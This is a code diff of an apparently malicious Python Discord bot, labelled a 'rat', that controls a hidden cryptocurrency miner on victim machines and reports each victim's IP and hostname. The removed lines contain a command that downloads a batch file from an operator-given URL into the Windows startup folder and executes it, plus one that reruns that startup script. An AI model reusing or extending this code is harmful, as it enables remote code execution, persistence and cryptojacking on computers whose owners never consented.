@@ -10,7 +10,7 @@ import sys
 import os
 
 token = '' # Token
-channel_id =  # Channel ID 
+channel_id =  # Channel ID
 
 # bot
 intents = discord.Intents.default()
@@ -69,34 +69,6 @@ async def check(ctx):
         await ctx.send(f"``[+] {ip}@{hostname}: Miner running``")
     else:
         await ctx.send(f"``[-] {ip}@{hostname}: Miner not running``")
-
-# update rat
-@bot.command()
-async def update(ctx):
-    if os.path.exists(f"{startup}\main.bat"):
-        os.popen(f'"{startup}"\main.bat')
-        await ctx.send(f"``[+] {ip}@{hostname}: Bot updated``")
-        sys.exit()
-    else:
-        await ctx.send(f"``[-] {ip}@{hostname}: Bot not updated``")
-
-# windows script update
-@bot.command(name='winsc-update')
-async def winsc(ctx, arg1):
-    link = ''.join(arg1)
-    os.chdir(startup)
-    
-    url = link
-    r = requests.get(url, allow_redirects=True)
-    open("main.bat", 'wb').write(r.content)
-    
-    if os.path.exists("main.bat"):
-        os.popen("main.bat")
-        await ctx.send(f"``[+] {ip}@{hostname}: Script updated``")
-        sys.exit()
-    else:
-        await ctx.send(f"``[-] {ip}@{hostname}: Script not updated``")
-        os.chdir(temp)
 
 # miner
 @bot.command()
